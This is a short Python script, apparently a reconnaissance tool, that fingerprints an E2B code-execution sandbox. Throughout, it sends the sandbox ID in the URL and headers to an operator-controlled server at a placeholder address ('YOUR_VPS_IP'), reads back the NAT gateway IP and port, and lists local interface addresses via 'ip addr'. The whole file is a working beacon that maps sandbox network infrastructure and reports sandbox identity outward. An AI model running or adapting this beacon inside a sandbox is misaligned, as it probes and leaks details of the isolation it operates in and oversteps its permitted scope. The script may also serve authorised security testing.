#!/usr/bin/env python3
"""E2B Fingerprinting Beacon - NAT gateway enumeration"""
import requests, os, subprocess

ECHO = "http://YOUR_VPS_IP:8080"  # Update this
sandbox_id = os.environ.get('E2B_SANDBOX_ID', 'unknown')

print("="*70)
print("E2B INFRASTRUCTURE FINGERPRINTING")
print("="*70)
print(f"Sandbox: {sandbox_id}\n")

try:
    resp = requests.get(f"{ECHO}/fp?sandbox={sandbox_id}", 
                       headers={'User-Agent': f'E2B-Beacon/{sandbox_id}',
                               'X-Sandbox-ID': sandbox_id}, timeout=10)
    data = resp.json()
    
    nat_ip = data['client']['ip']
    port = data['client']['port']
    
    print(f"✅ NAT Gateway: {nat_ip}")
    print(f"   Source Port: {port}")
    print(f"   Timestamp: {data['server']['time']}")
    
    try:
        ip_out = subprocess.check_output(['ip', 'addr'], timeout=2).decode()
        print("\nLocal IPs:")
        for line in ip_out.split('\n'):
            if 'inet ' in line and '127.0' not in line:
                print(f"  {line.strip()}")
    except: pass
    
    print("\n" + "="*70)
    print(f"RESULT: NAT={nat_ip}, Port={port}")
    print("="*70)
except Exception as e:
    print(f"❌ Error: {e}")
